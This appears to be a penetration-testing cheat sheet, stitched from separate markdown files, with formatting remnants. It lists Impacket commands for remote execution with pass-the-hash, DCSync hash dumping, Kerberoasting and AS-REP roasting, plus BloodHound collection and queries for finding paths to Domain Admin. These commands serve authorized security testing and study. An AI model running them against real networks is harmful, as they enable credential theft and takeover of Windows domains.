Impacket Suite

Overview
Impacket is a collection of Python classes for working with network protocols. It's essential for Windows penetration testing.

Key Tools

PSExec.py
Remote command execution via SMB

psexec.py domain/user:password@target
psexec.py -hashes :ntlmhash domain/user@target
WMIExec.py

Remote execution via WMI
bashwmiexec.py domain/user:password@target
wmiexec.py -hashes :ntlmhash domain/user@target
SMBExec.py

Remote execution via SMB
bashsmbexec.py domain/user:password@target
smbexec.py -hashes :ntlmhash domain/user@target

DCSync Attack
bashsecretsdump.py domain/user:password@dc-ip
secretsdump.py -hashes :ntlmhash domain/user@dc-ip

Kerberoasting
bashGetUserSPNs.py domain/user:password -dc-ip dc-ip -request

ASREPRoasting
bashGetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt


Installation
bashpip install impacket
 or
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

 Windows-Tools/BloodHound.md

markdown
 BloodHound

 Overview
BloodHound is a tool for analyzing Active Directory security and finding attack paths.

 Components
- BloodHound: Neo4j-based analysis engine
- SharpHound: Data collector for Windows
- BloodHound.py: Python-based collector

 Data Collection

 SharpHound (Windows)
powershell
.\SharpHound.exe -c All -d domain.local
.\SharpHound.exe --CollectionMethod All --Domain domain.local
BloodHound.py (Linux)
bashbloodhound-python -u username -p password -ns dc-ip -d domain.local -c all
Analysis Queries
Find Domain Admins
cypherMATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN u.name
Find Shortest Path to Domain Admin
cypherMATCH (u:User {name:"USERNAME@DOMAIN.LOCAL"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((u)-[*1..]->(g)) RETURN p
Find Kerberoastable Users
cypherMATCH (u:User {hasspn:true}) RETURN u.name
Installation
bash Neo4j
sudo apt install neo4j
 BloodHound
sudo apt install bloodhound
 Python collector
pip install bloodhound
